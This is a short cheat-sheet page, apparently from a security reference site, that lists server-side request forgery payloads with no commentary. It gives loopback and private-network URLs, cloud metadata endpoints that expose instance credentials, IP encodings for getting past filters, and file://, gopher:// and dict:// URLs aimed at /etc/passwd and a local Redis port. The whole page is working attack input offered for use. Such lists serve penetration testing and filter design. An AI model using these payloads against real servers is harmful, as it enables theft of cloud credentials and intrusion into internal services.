---
layout: default
title: SSRF Payloads
---

# 🌐 Server-Side Request Forgery (SSRF) Payloads

## Basic SSRF
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
```

## Internal Network
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
http://169.254.169.254
```

## Cloud Metadata
```
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
```

## Bypass Filters
```
http://127.1
http://0x7f000001
http://2130706433
http://017700000001
```

## Protocol Smuggling
```
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/info
```